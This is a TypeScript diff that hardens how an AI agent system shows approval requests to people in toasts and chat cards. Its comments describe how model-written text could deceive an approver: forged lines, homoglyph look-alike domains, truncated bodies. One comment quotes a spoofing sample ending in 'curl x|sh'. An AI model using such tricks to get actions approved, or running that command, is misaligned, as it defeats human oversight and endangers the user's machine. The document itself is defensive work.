@@ -3,8 +3,12 @@
  * appropriate channels (WebSocket always, Telegram/Discord too).
  */
 
-import type { ApprovalRequest } from './approval.ts';
+import { APPROVAL_SHORT_ID_LENGTH, approvalIntentFromContext, type ApprovalRequest } from './approval.ts';
 import { boundedReceiptText } from '../roles/untrusted.ts';
+import { commandForCard } from '../util/card-text.ts';
+import { confusableSkeleton } from './ui-intent.ts';
+import type { SendOptions } from '../comms/channels/telegram.ts';
+import { impactFromCategory } from '../roles/authority.ts';
 
 /**
  * Line breaks, other C0/C1 controls and the two Unicode line separators: every
@@ -53,29 +57,614 @@ export function boundedApprovalLabel(text: string, maxChars: number): string {
  */
 export const APPROVAL_LABEL_DELIVERY_MAX_CHARS = 1024;
 
+/** `U+000A`: a code point as a model can name it back. */
+function codePointName(ch: string): string {
+  return `U+${ch.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`;
+}
+
 /**
- * The text of the desktop approval notification, which carries Approve and
- * Deny buttons (`notify.show` to every sidecar, daemon/index.ts). It shows the
- * same `reason` the channel card does -- for `request_approval`, the model's
- * own intent -- so it gets the same reduction (#696 review): one line, no
- * format characters, the delivery backstop.
+ * Why this code would alter `text` on its way to an approval surface, or null
+ * when every surface's text receives it exactly as written (#724).
+ *
+ * The test is `boundedApprovalLabel` itself at the delivery ceiling, so it
+ * cannot drift from what the channel card and the desktop toast do: null means
+ * `boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS) === text`.
+ * The other branches only say WHICH alteration it would be, in words a model
+ * can act on. That covers what THIS code does to the text, not what a
+ * renderer does after it. (Since #718 the channel card is sent as literal
+ * text: Telegram with no parse mode, Discord with every markup character
+ * escaped. Telegram still turns a URL or an @name into a link, with its text
+ * unchanged.)
+ *
+ * It refuses ordinary text that carries a format character, too: an emoji
+ * built with a zero-width joiner, a left-to-right or right-to-left mark in
+ * Hebrew or Arabic text, a soft hyphen. Each of those is stripped by the
+ * label reduction, so the card would not show what was written.
  */
-export function approvalNotificationText(request: Pick<ApprovalRequest, 'tool_name' | 'agent_name' | 'reason'>): {
-  title: string; body: string;
-} {
+export function approvalLabelAlteration(text: string): string | null {
+  const brk = new RegExp(LABEL_BREAKS.source, 'u').exec(text);
+  if (brk) return `it contains a line break, tab or other control character (${codePointName(brk[0])} at position ${brk.index})`;
+  const fmt = new RegExp(LABEL_FORMAT.source, 'u').exec(text);
+  if (fmt) return `it contains an invisible formatting character (${codePointName(fmt[0])} at position ${fmt.index})`;
+  if (text.length > APPROVAL_LABEL_DELIVERY_MAX_CHARS) {
+    return `it is ${text.length} characters long; the approval card shows at most ${APPROVAL_LABEL_DELIVERY_MAX_CHARS}`;
+  }
+  if (boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS) !== text) {
+    return 'it contains text the approval card would rewrite (a content-framing marker or an unpaired surrogate)';
+  }
+  return null;
+}
+
+/**
+ * The most text, in display columns, a desktop approval toast may show before
+ * its Approve and Deny buttons (#791).
+ *
+ * The OS cuts a toast's body, not this code: Windows' ToastGeneric template
+ * and macOS banners show a few lines and drop the rest, right beside the
+ * buttons, so a long body was approved with its tail unseen.
+ *
+ * THIS IS NOT A MEASUREMENT. Nothing in the daemon can see how much a given
+ * machine shows -- that depends on the OS version, banner or alert style,
+ * display scaling, font and language -- and it has not been measured on real
+ * Windows 11 or macOS banners either. It is a deliberately conservative
+ * choice: two lines of about forty Latin characters, which is the smallest
+ * layout we design for (a macOS banner shows its body in about two lines;
+ * Windows shows more). Text is measured the way it will wrap (`toastLines`):
+ * two lines of `TOAST_APPROVABLE_MAX_COLUMNS / 2` columns, filled word by word,
+ * a word longer than a line taking as many lines as it needs. A character
+ * counts as one column only if it is a precomposed Latin, Greek or Cyrillic
+ * letter, ASCII, Latin-1 or a common dash or quote; as two in East Asian wide
+ * text and emoji; and any other character -- a ligature like U+FDFD that
+ * renders a dozen cells wide, cuneiform, a Letterlike Symbol, a combining or
+ * spacing mark, a variation selector, a right-to-left letter -- makes the toast
+ * review-only: an unknown width fails closed. Accented Latin text arrives
+ * precomposed (NFC) in practice, so it stays approvable.
+ *
+ * It is the one dial for how often a toast can be approved directly: above
+ * it the toast is review-only and approving needs the dashboard. To tighten
+ * or loosen it, screenshot real approval toasts on Windows 11 (100% and 150%
+ * scaling) and macOS 14/15 (banner and alert styles) with bodies of known
+ * length, take the longest that every one of them shows whole together with
+ * its ` · <impact>` suffix, and set it at or below that.
+ */
+export const TOAST_APPROVABLE_MAX_COLUMNS = 80;
+
+/** How many lines the budget is: the narrowest layout shows the body in about two. */
+const TOAST_APPROVABLE_LINES = 2;
+const TOAST_LINE_COLUMNS = TOAST_APPROVABLE_MAX_COLUMNS / TOAST_APPROVABLE_LINES;
+
+/** Precomposed Latin, Greek and Cyrillic letters, ASCII, Latin-1 and the common dashes, quotes and the euro sign: one Latin cell each. Deliberately narrow (#791 review): Letterlike Symbols such as U+213B and per-mille signs render two or three cells wide, and right-to-left letters reorder the runs around them. U+2024 ONE DOT LEADER is left out (#812 re-review): it is the one punctuation mark here whose skeleton is exactly `.`, so `paypal․com` read as a domain; out of the list its width is unknown and the toast is review-only. */
+const ONE_COLUMN = /^[ -~\u00a0-\u024f\u0370-\u03ff\u0400-\u0482\u048a-\u04ff\u1e00-\u1eff\u2010-\u2023\u2025-\u2027\u20ac]$/u;
+/** East Asian Wide/Fullwidth text and the emoji and pictograph blocks: two columns. */
+const TWO_COLUMNS = /^[\u1100-\u115f\u2600-\u27bf\u2e80-\u303e\u3041-\u33ff\u3400-\u4dbf\u4e00-\u9fff\ua000-\ua4cf\uac00-\ud7a3\uf900-\ufaff\ufe30-\ufe4f\uff00-\uff60\uffe0-\uffe6\u{1f300}-\u{1f64f}\u{1f680}-\u{1f6ff}\u{1f900}-\u{1f9ff}\u{1fa70}-\u{1faff}\u{20000}-\u{3fffd}]$/u;
+
+/** One character's width in columns, or null when it is not known. */
+function charColumns(ch: string): number | null {
+  if (ONE_COLUMN.test(ch)) return 1;
+  if (TWO_COLUMNS.test(ch)) return 2;
+  return null;
+}
+
+/** Display columns of `text`, or null when any character's width is not known. */
+export function toastColumns(text: string): number | null {
+  let columns = 0;
+  for (const ch of text) {
+    const width = charColumns(ch);
+    if (width === null) return null;
+    columns += width;
+  }
+  return columns;
+}
+
+/**
+ * How many toast lines `text` fills when wrapped word by word at
+ * `TOAST_LINE_COLUMNS`, stopping as soon as it passes the approvable budget
+ * (the body can be a whole command). Infinity when a character's width is not
+ * known.
+ */
+export function toastLines(text: string): number {
+  let lines = 1;
+  let column = 0;
+  // Word by word with indexOf rather than split, so the work stops with the
+  // budget instead of first walking the whole body.
+  for (let start = 0; start <= text.length;) {
+    const space = text.indexOf(' ', start);
+    const end = space < 0 ? text.length : space;
+    const word = text.slice(start, end);
+    start = end + 1;
+    const width = toastColumns(word);
+    if (width === null) return Number.POSITIVE_INFINITY;
+    if (column > 0 && column + 1 + width <= TOAST_LINE_COLUMNS) {
+      column += 1 + width;
+    } else {
+      if (column > 0) lines++;
+      lines += Math.max(0, Math.ceil(width / TOAST_LINE_COLUMNS) - 1);
+      column = width > TOAST_LINE_COLUMNS ? width % TOAST_LINE_COLUMNS || TOAST_LINE_COLUMNS : width;
+    }
+    if (lines > TOAST_APPROVABLE_LINES) return lines;
+  }
+  return lines;
+}
+
+/**
+ * Scripts a toast body's letters are written in, for `toastLookAlike`. Han,
+ * kana, Hangul and Bopomofo count as one, since Japanese and Korean mix them
+ * in ordinary text; Common and Inherited letters (modifier letters and the
+ * like) belong to no script; any script not listed counts as `other`.
+ */
+const TOAST_SCRIPTS: ReadonlyArray<[string, RegExp]> = [
+  ['latin', /^\p{Script=Latin}$/u],
+  ['greek', /^\p{Script=Greek}$/u],
+  ['cyrillic', /^\p{Script=Cyrillic}$/u],
+  ['cjk', /^[\p{Script=Han}\p{Script=Hiragana}\p{Script=Katakana}\p{Script=Hangul}\p{Script=Bopomofo}]$/u],
+];
+const NO_SCRIPT = /^[\p{Script=Common}\p{Script=Inherited}]$/u;
+
+function mixesScripts(text: string): boolean {
+  let first: string | null = null;
+  for (const ch of text) {
+    if (!/^\p{L}$/u.test(ch) || NO_SCRIPT.test(ch)) continue;
+    const script = TOAST_SCRIPTS.find(([, re]) => re.test(ch))?.[0] ?? 'other';
+    if (first === null) first = script;
+    else if (script !== first) return true;
+  }
+  return false;
+}
+
+/**
+ * Whether a toast body could be a look-alike (#812): its letters mix scripts
+ * AND its UTS #39 skeleton (`confusableSkeleton`, #794) differs from it, so
+ * some character in it is listed as confusable with another -- `pаypal` with a
+ * Cyrillic `а` is both -- or it holds a non-ASCII letter that reads as ASCII
+ * beside ASCII text (`asciiLookAlike`). Such a toast is review-only.
+ *
+ * The width allow-list admits Greek and Cyrillic letters because they are one
+ * column and legitimate, so on its own it let `pаypal` through: within the
+ * budget, every character of known width, and approvable from the surface
+ * with the least context and the most casual tap.
+ *
+ * Neither half is enough alone. The skeleton maps some ASCII too (`m` ->
+ * `rn`, `I` -> `l`) and NFD-decomposes accents, so it differs from almost any
+ * real sentence; and mixing scripts is ordinary in a name (`Send email to
+ * Дмитрий`). Together they still make that second toast review-only -- a cost
+ * of this check, which only ever removes Approve, never adds it. What it does
+ * not catch is a body written entirely in one non-Latin script that reads as
+ * another (`рау` all in Cyrillic, with no ASCII beside it), or a punctuation
+ * look-alike; the dashboard card, which shows the full request, is the place
+ * for those.
+ */
+export function toastLookAlike(body: string): boolean {
+  return (mixesScripts(body) && confusableSkeleton(body) !== body) || asciiLookAlike(body);
+}
+
+const ASCII_ALNUM = /[A-Za-z0-9]/;
+const PRINTABLE_ASCII = /^[\x20-\x7e]+$/;
+
+/**
+ * A non-ASCII letter or digit whose skeleton is plain ASCII, in a body that
+ * also has ASCII letters or digits (#812 review): a look-alike WITHIN one
+ * script, which `mixesScripts` cannot see. `paypaǀ.com` (U+01C0, a Latin
+ * click letter, for `l`) and `mıcrosoft.com` (U+0131 dotless i) are all Latin,
+ * inside the width allow-list and the budget, and read as the real names.
+ *
+ * Measured over the toast's one-column allow-list: 133 letters and 3 digits
+ * have an ASCII skeleton, most of them Greek and Cyrillic (already caught
+ * above when mixed with Latin), plus the Latin ones that matter here. The
+ * cost: a body that mixes ASCII with `ı` (Turkish), `æ`/`œ` (French ligatures,
+ * skeleton `ae`/`oe`) or `þ` is review-only. Accented letters are not
+ * affected: their skeleton keeps the combining mark, so it is not ASCII.
+ *
+ * Punctuation is left out on purpose: curly quotes and dashes have ASCII
+ * skeletons and are ordinary in model-written text. That leaves punctuation
+ * look-alikes such as U+2024 ONE DOT LEADER for `.` approvable; see the issue
+ * filed with #812.
+ */
+function asciiLookAlike(body: string): boolean {
+  if (!ASCII_ALNUM.test(body)) return false;
+  for (const ch of body) {
+    if (ch <= '\x7f' || !/^[\p{L}\p{N}]$/u.test(ch)) continue;
+    if (LATIN_LOOK_ALIKES.test(ch)) return true;
+    const s = confusableSkeleton(ch);
+    if (s !== ch && PRINTABLE_ASCII.test(s)) return true;
+  }
+  return false;
+}
+
+/**
+ * Letters and digits inside the one-column allow-list that read as ASCII but
+ * whose skeleton is not ASCII, so the rule above cannot see them (#812
+ * re-review, each measured): kra U+0138 (`booĸing`), U+0185 for `b`, the
+ * middle-dot L U+013F/U+0140, the ordinals U+00AA/U+00BA, and the superscript
+ * digits U+00B9/U+00B2/U+00B3. Letters with a mark BELOW (`ạ`, `ḷ`) are still
+ * approvable: flagging them would cost Vietnamese, which is a decision of its
+ * own (filed with #812).
+ */
+const LATIN_LOOK_ALIKES = /^[ĸƅĿŀªº¹²³]$/u;
+
+/** The longest prefix of `text` that fits `max` columns, an unknown width counted wide. */
+function fitColumns(text: string, max: number): string {
+  let columns = 0;
+  let out = '';
+  for (const ch of text) {
+    columns += charColumns(ch) ?? 4;
+    if (columns > max) break;
+    out += ch;
+  }
+  return out;
+}
+
+/** A `notify.show` payload for one approval, and whether it offers Approve. */
+export type ApprovalToast = {
+  id: string;
+  /** `approval` carries Approve/Deny; `approval_review` only opens Jarvis. */
+  kind: 'approval' | 'approval_review';
+  title: string;
+  body: string;
+  meta: string;
+  destructive: boolean;
+  actions: Array<{ id: string; label: string; primary?: boolean }>;
+  approvable: boolean;
+};
+
+/**
+ * The desktop approval toast (`notify.show` to every sidecar, daemon/index.ts).
+ *
+ * The body is what will happen (`approvalIntentParts`, #789); the meta is the
+ * impact, the tool and then why approval was needed. The sidecar renders
+ * `body · meta` as one text under the title, and the OS cuts it to a few lines
+ * (#791). So the part the person decides on -- the body, then the impact that
+ * leads the meta -- must fit `TOAST_APPROVABLE_MAX_COLUMNS` as it wraps
+ * (`toastLines`) for the toast to carry Approve and Deny. What follows the impact may be cut
+ * by the OS, and is never what the decision is about.
+ *
+ * So is a body that fits but could be a cross-script look-alike
+ * (`toastLookAlike`, #812), shown whole with that reason in the meta.
+ *
+ * Above the budget the toast is review-only: no Approve, no Deny, an "Open
+ * Jarvis" action, the body cut here with a visible `...`, and its own kind,
+ * `approval_review`. The kind matters, not just the action list: the macOS
+ * sidecar takes a notification's buttons from a category registered per kind,
+ * and the `approval` category always has Approve and Deny, whatever actions
+ * the payload lists. An `approval_review` kind is not a registered category on
+ * any sidecar shipped so far, which macOS renders with no buttons (tapping the
+ * banner still opens Jarvis), and the daemon acts on a notification's
+ * approve/deny only for kind `approval` (`notificationApprovalDecision`).
+ *
+ * Every text is reduced like a channel-card label: one line, no format
+ * characters, so a line break cannot forge a line of the toast's layout.
+ */
+export function approvalToast(request: ApprovalRequest): ApprovalToast {
   const label = (text: string) => boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS);
   const words = label(request.tool_name).replace(/[_-]+/g, ' ').trim();
   const tool = words ? words.charAt(0).toUpperCase() + words.slice(1) : 'Action';
-  const reason = label(request.reason?.trim() ?? '');
-  return { title: `Approve: ${tool}?`, body: reason || `${label(request.agent_name)} wants to run ${tool}.` };
+  // What will happen leads (#789): the gate's sentence, the same one the
+  // dashboard and the channel card lead with. Before, the body was `reason`
+  // alone, so every gated tool's toast read "execute_command requires user
+  // approval" and the command, machine, path or skill steps were never shown.
+  const { action, reason } = approvalIntentParts(request);
+  const body = boundedApprovalLabel(action, action.length);
+  const impact = impactFromCategory(request.action_category);
+  const toolLabel = label(request.tool_name);
+  const destructive = impact === 'destructive';
+  // The look-alike check runs only on a body that already fits, so it never
+  // walks a long one (toastLines stops with the budget).
+  const fits = toastLines(`${body} · ${impact}`) <= TOAST_APPROVABLE_LINES;
+  const lookAlike = fits && toastLookAlike(body);
+  const approvable = fits && !lookAlike;
+  if (approvable) {
+    // The reason goes last, after the impact and the tool: it says why
+    // approval was needed, and it is the part an OS cut may take.
+    return {
+      id: request.id, kind: 'approval', title: `Approve: ${tool}?`, body,
+      meta: `${impact} · ${toolLabel}${reason ? ` · ${reason}` : ''}`, destructive,
+      actions: [{ id: 'deny', label: 'Deny' }, { id: 'approve', label: 'Approve', primary: true }],
+      approvable,
+    };
+  }
+  // Leave room for the `...` and the ` · <impact>` that follows the body. A
+  // look-alike body already fits, so it is shown whole, with the reason.
+  const room = TOAST_APPROVABLE_MAX_COLUMNS - `... · ${impact}`.length;
+  return {
+    id: request.id, kind: 'approval_review', title: `Review in Jarvis: ${tool}`,
+    body: lookAlike ? body : `${fitColumns(body, room).trimEnd()}...`,
+    meta: `${impact} · ${toolLabel} · ${lookAlike ? 'mixes letters from different alphabets, so check it in Jarvis' : 'too long to approve from a notification'}`, destructive,
+    actions: [{ id: 'review', label: 'Open Jarvis', primary: true }, { id: 'dismiss', label: 'Dismiss' }],
+    approvable,
+  };
 }
+
+/**
+ * What an approval will do, and why it needed approval, as two separate texts.
+ *
+ * WHAT WILL HAPPEN (`action`) is what the person is deciding on; WHY approval
+ * was needed (`reason`) is the Authority engine's decision reason (#721).
+ * `request.reason` is that reason on every request but one, and the engine's
+ * wording names a category or a rule, never the effect: `Override requires
+ * approval for execute_command`, a context rule's own `description`,
+ * `send_email is a governed action requiring user approval`. This used to
+ * recognise the engine only by two suffixes and the taint label and let any
+ * other reason REPLACE the sentence, so an override or a context rule hid the
+ * command, the path or the skill's steps entirely: the reviewer saw why
+ * approval was needed but not what would happen.
+ *
+ * The one exception is `request_approval`, whose `reason` IS the model's
+ * declared intent (#696): that is the action, reduced to one line with no
+ * format characters and not cut, and it has no separate reason. Its `context`
+ * is model-written too, so it is never read as a gate sentence
+ * (`approvalIntentFromContext`) -- before #721 an intent ending in "requires
+ * user approval" made the model's own context JSON the headline.
+ *
+ * The reason gets the same one-line reduction: a context rule's description is
+ * free text from config. The engine's own wording comes back byte-exact.
+ *
+ * Neither part is cut here. Each surface decides how much it can show, and a
+ * surface that cannot show the action whole must not offer to approve it
+ * (`approvalChannelCard`, the desktop toast).
+ */
+export function approvalIntentParts(request: ApprovalRequest): { action: string; reason: string } {
+  const raw = (request.reason ?? '').trim();
+  const reason = boundedApprovalLabel(raw, raw.length).trim();
+  if (request.tool_name === 'request_approval' && reason) return { action: reason, reason: '' };
+  return { action: synthesizeApprovalIntent(request), reason };
+}
+
+/**
+ * The body of the "Task complete" toast for an approval that finished
+ * executing (#813): what it did, the same sentence the approval toast led with
+ * (`approvalIntentParts(...).action`), reduced to one line. It used to be
+ * `request.reason`, the Authority engine's reason for asking, so a finished
+ * command read "execute_command requires user approval" rather than naming
+ * what ran. Empty only when there is no sentence at all; the caller then names
+ * the tool.
+ *
+ * A sentence longer than a toast shows is cut to `TOAST_APPROVABLE_MAX_COLUMNS`
+ * with a visible `...`, measured as the approval toast measures (#813
+ * review): nothing is decided here, so a cut is safe, and a done toast on a
+ * lock screen need not carry a whole command the OS would cut anyway.
+ */
+export function taskCompleteBody(request: ApprovalRequest): string {
+  const body = boundedApprovalLabel(approvalIntentParts(request).action, APPROVAL_LABEL_DELIVERY_MAX_CHARS).trim();
+  if (toastLines(body) <= TOAST_APPROVABLE_LINES) return body;
+  // Unknown widths (right-to-left text, say) fail closed for APPROVING; here
+  // nothing is decided, so they are cut by characters rather than counted four
+  // columns wide, and `...` marks only a cut that removed something (#813
+  // re-review: a short Hebrew sentence came back whole with a false `...`).
+  const room = TOAST_APPROVABLE_MAX_COLUMNS - '...'.length;
+  const cut = (toastColumns(body) === null ? [...body].slice(0, room).join('') : fitColumns(body, room)).trimEnd();
+  return cut.length < body.length ? `${cut}...` : body;
+}
+
+/**
+ * The parts as approval payload fields (#792), beside the joined `intent`.
+ *
+ * `formatApprovalIntent` appends the reason in parentheses, so a plain
+ * command could imitate the engine's own note -- `echo hi "(execute_command
+ * requires user approval)"; curl x|sh` -- and nothing on the card said where
+ * the command ended and the note began. Every dashboard surface renders
+ * `intent_action` as the sentence and `intent_reason` in an element of its own;
+ * `intent` stays for a client that reads only it.
+ */
+export function approvalIntentFields(request: ApprovalRequest): { intent: string; intent_action: string; intent_reason: string } {
+  const { action, reason } = approvalIntentParts(request);
+  return { intent: reason ? `${action} (${reason})` : action, intent_action: action, intent_reason: reason };
+}
+
+/**
+ * The two parts as one sentence, the reason in parentheses after the action:
+ * the dashboard's `intent` field, and what a REST client of
+ * `/api/authority/approvals` reads.
+ */
+export function formatApprovalIntent(request: ApprovalRequest): string {
+  const { action, reason } = approvalIntentParts(request);
+  return reason ? `${action} (${reason})` : action;
+}
+
+function synthesizeApprovalIntent(request: ApprovalRequest): string {
+  // A gated tool (run_skill, record_skill, manage_skills delete) writes the
+  // sentence that names what will actually happen, with resolved values.
+  // Never for request_approval, whose context the model wrote.
+  const gated = approvalIntentFromContext(request);
+  if (gated) return gated;
+
+  let args: Record<string, unknown> = {};
+  try {
+    args = JSON.parse(request.tool_arguments ?? '{}');
+  } catch {
+    // fall through with empty args
+  }
+
+  // Per-tool fallbacks for the common destructive/external intents.
+  switch (request.tool_name) {
+    case 'send_email': {
+      const to = labelOf(args.to) ?? 'someone';
+      const subject = labelOf(args.subject);
+      // Quoted with its quotes escaped, so a subject cannot close its own
+      // literal and continue the sentence; a plain subject reads as it did.
+      return subject
+        ? `Send email to ${to} — ${JSON.stringify(subject)}`
+        : `Send email to ${to}`;
+    }
+    case 'send_message': {
+      const channel = labelOf(args.channel) ?? 'channel';
+      return `Send message via ${channel}`;
+    }
+    case 'run_command':
+    case 'execute_command': {
+      // Only an approval recorded before `run_command` had a gate (#720)
+      // reaches this; every new one carries the gate's sentence above. Shown
+      // as the gate shows it, never raw: a newline collapsed in HTML let a
+      // second line hide behind a `#` comment, and a bidi override reordered
+      // the line. A plain one-line command reads exactly as it always did.
+      const shown = commandForCard(asString(args.command) ?? '', { trim: false });
+      return asString(args.command) === undefined ? 'Run a shell command' : `R${shown.slice(1)}`;
+    }
+    case 'delete_file':
+    case 'delete_data': {
+      const path = labelOf(args.path) ?? labelOf(args.target) ?? 'the target';
+      return `Delete ${path}`;
+    }
+    case 'install_software': {
+      const pkg = labelOf(args.package) ?? labelOf(args.name) ?? 'software';
+      return `Install ${pkg}`;
+    }
+    case 'make_payment': {
+      const amount = labelOf(args.amount) ?? labelOf(args.total);
+      const to = labelOf(args.recipient) ?? labelOf(args.to) ?? 'recipient';
+      return amount ? `Pay ${amount} to ${to}` : `Make a payment to ${to}`;
+    }
+    case 'spawn_agent': {
+      const role = labelOf(args.role) ?? labelOf(args.specialist) ?? 'an agent';
+      return `Spawn ${role}`;
+    }
+    default: {
+      // Governed workflow-piece effects: `piece:<catalog id>/<action>`. The
+      // durable effect's target rides along in `context`, so the sentence can
+      // name the recipient, file or endpoint rather than just the piece.
+      const governedPiece = /^piece:([^/]+)\/(.+)$/u.exec(request.tool_name);
+      if (governedPiece) return describeGovernedPieceIntent(governedPiece[1]!, governedPiece[2]!, request);
+      const verb = request.tool_name.replace(/_/g, ' ');
+      return `${verb}`.replace(/^./, (c) => c.toUpperCase());
+    }
+  }
+}
+
+/** A governed piece's target value in the dashboard sentence: the 80 it always had. */
+const GOVERNED_TARGET_VALUE_MAX_CHARS = 80;
+
+/**
+ * "Gmail - send email to finance@example.test, subject: Q3 invoice".
+ *
+ * Reads the reviewed target out of the approval's context, which is what the
+ * piece adapter resolved from the step's real input. A card that said only
+ * "gmail" would not be governance.
+ */
+function describeGovernedPieceIntent(pieceId: string, action: string, request: ApprovalRequest): string {
+  const label = pieceId.replace(/-/g, ' ').replace(/^./, c => c.toUpperCase());
+  const verb = action.replace(new RegExp(`^${pieceId.replace(/-/g, '_')}_`, 'u'), '').replace(/[_-]/g, ' ');
+  let target: Record<string, unknown> = {};
+  try {
+    const context: unknown = JSON.parse(request.context ?? '{}');
+    if (context && typeof context === 'object' && !Array.isArray(context)) {
+      const raw = (context as Record<string, unknown>).target;
+      if (raw && typeof raw === 'object' && !Array.isArray(raw)) target = raw as Record<string, unknown>;
+    }
+  } catch {
+    // No context to read; the piece and action alone still describe the step.
+  }
+  const details: string[] = [];
+  for (const [key, value] of Object.entries(target)) {
+    if (key === 'piece' || key === 'action' || key === 'unmappedAction') continue;
+    const rendered = Array.isArray(value) ? value.map(item => String(item)).join(', ')
+      : value === null || typeof value === 'object' ? undefined : String(value);
+    if (!rendered) continue;
+    // The step's real input, which a flow can wire from anything it read, so
+    // one line with no format characters before the 80-character cut (#697):
+    // the same reduction #651 gave the Telegram card's labels.
+    const shown = boundedApprovalLabel(rendered, GOVERNED_TARGET_VALUE_MAX_CHARS) || '(invisible characters only)';
+    details.push(`${key.replace(/_/g, ' ')}: ${shown}`);
+    if (details.length === 3) break;
+  }
+  const head = `${label} - ${verb}`;
+  return details.length > 0 ? `${head} (${details.join(', ')})` : head;
+}
+
+function asString(v: unknown): string | undefined {
+  return typeof v === 'string' && v.length > 0 ? v : undefined;
+}
+
+/**
+ * A model-supplied argument in a fallback sentence: one line with no format
+ * characters, not cut (#721 review). Since #721 these sentences lead the card
+ * whenever the engine's reason is an override or a context rule, where before
+ * the reason replaced them, so they get the reduction the headline gets. A
+ * value that reduces to nothing falls back like a missing one.
+ */
+function labelOf(v: unknown): string | undefined {
+  const s = asString(v);
+  return s === undefined ? undefined : boundedApprovalLabel(s, s.length).trim() || undefined;
+}
+
+
+/** A label as the channel card shows it, and whether showing it cut anything. */
+function cardLine(text: string): { shown: string; cut: boolean } {
+  const shown = boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS);
+  return { shown, cut: shown !== boundedApprovalLabel(text, text.length) };
+}
+
+/**
+ * The Telegram/Discord approval card (#718), and whether it may be approved by
+ * replying to it.
+ *
+ * It leads with what will happen -- the gate's sentence, the same one the
+ * dashboard leads with -- on its own `Intent:` line. Before #718 it carried
+ * only `Action:`, `Agent:` and `Reason:`, so a `site_run_command` was approved
+ * from a chat without the command ever being shown. The reason keeps its own
+ * `Reason:` line rather than following the sentence in parentheses, so a
+ * command cannot imitate it.
+ *
+ * Every line is reduced like any label: one line, no format characters, the
+ * delivery backstop. A line the backstop CUT is not shown whole, and a card
+ * longer than one message (`CHANNEL_CARD_APPROVABLE_MAX_CHARS`) is not shown
+ * as one piece, so either card then offers only `deny` and sends the person
+ * to the dashboard to approve;
+ * `approvable` is what the channel reply handler (`channelApprovalReply`)
+ * checks before it acts on an `approve`. Denying something you could not
+ * read whole is always safe.
+ *
+ * The card is sent as literal text (`{ literal: true }`): Telegram's Markdown
+ * and Discord's markdown would otherwise render a label's own `[text](url)`,
+ * `||spoiler||`, `*`/`_` pairs or mentions, which can hide or drop part of
+ * what is being approved.
+ */
+export function approvalChannelCard(request: ApprovalRequest): { text: string; approvable: boolean } {
+  const shortId = request.id.slice(0, APPROVAL_SHORT_ID_LENGTH);
+  const { action, reason } = approvalIntentParts(request);
+  const intent = cardLine(action);
+  const tool = cardLine(request.tool_name);
+  const agent = cardLine(request.agent_name);
+  const why = cardLine(reason);
+  const head = [
+    `[APPROVAL NEEDED]`,
+    `Intent: ${intent.shown}`,
+    `Action: ${tool.shown} (${request.action_category})`,
+    `Agent: ${agent.shown}`,
+    ...(why.shown ? [`Reason: ${why.shown}`] : []),
+    ``,
+  ];
+  const approvableText = [...head, `Reply with:`, `  approve ${shortId}`, `  deny ${shortId}`].join('\n');
+  // Whole on every line AND one message on every channel: a card split over
+  // several messages can interleave with another card sent at the same time,
+  // so one card's tail -- its `approve` line included -- would sit under
+  // another card's head (#718 review).
+  const approvable = ![intent, tool, agent, why].some((line) => line.cut)
+    && approvableText.length <= CHANNEL_CARD_APPROVABLE_MAX_CHARS;
+  if (approvable) return { approvable, text: approvableText };
+  return {
+    approvable,
+    text: [
+      ...head,
+      `This is too long to show whole in one message here, so it cannot be approved from this chat.`,
+      `Open the Jarvis dashboard to read all of it and decide, or reply:`,
+      `  deny ${shortId}`,
+    ].join('\n'),
+  };
+}
+
+/**
+ * The longest approval card that can be approved by reply: one that every
+ * channel delivers as ONE message. Discord's limit is 2000 characters and the
+ * literal escape at most doubles the text (`discordLiteral`, pinned by its
+ * test), so 1000 raw characters always fit; Telegram's 4096 is larger.
+ * Derived, not chosen: raising it lets a card span two Discord messages.
+ */
+export const CHANNEL_CARD_APPROVABLE_MAX_CHARS = 1000;
 
 export type ApprovalBroadcaster = {
   broadcastApprovalRequest(request: ApprovalRequest): void;
 };
 
 export type ChannelSender = {
-  broadcastToAll(text: string): Promise<void>;
+  broadcastToAll(text: string, options?: SendOptions): Promise<void>;
 };
 
 export class ApprovalDelivery {
@@ -100,32 +689,12 @@ export class ApprovalDelivery {
     // Always push to Telegram/Discord so users can approve/deny directly
     // from messaging channels without opening the dashboard.
     if (this.channelSender) {
-      const message = this.formatApprovalMessage(request);
       try {
-        await this.channelSender.broadcastToAll(message);
+        const card = approvalChannelCard(request);
+        await this.channelSender.broadcastToAll(card.text, { literal: true });
       } catch (err) {
         console.error('[ApprovalDelivery] Failed to send to external channels:', err);
       }
     }
-  }
-
-  private formatApprovalMessage(request: ApprovalRequest): string {
-    const shortId = request.id.slice(0, 8);
-    const label = (text: string) => boundedApprovalLabel(text, APPROVAL_LABEL_DELIVERY_MAX_CHARS);
-    // `reason` too (#696). The Authority engine's reasons are its own wording,
-    // but `request_approval` stores the model's `intent` there verbatim, so a
-    // line break in it forged an `Action:` or `Agent:` line under this one.
-    // Same backstop as the labels: an engine reason is far below it and comes
-    // back byte-exact, and a declared intent is meant to be one line.
-    return [
-      `[APPROVAL NEEDED]`,
-      `Action: ${label(request.tool_name)} (${request.action_category})`,
-      `Agent: ${label(request.agent_name)}`,
-      `Reason: ${label(request.reason)}`,
-      ``,
-      `Reply with:`,
-      `  approve ${shortId}`,
-      `  deny ${shortId}`,
-    ].join('\n');
   }
 }
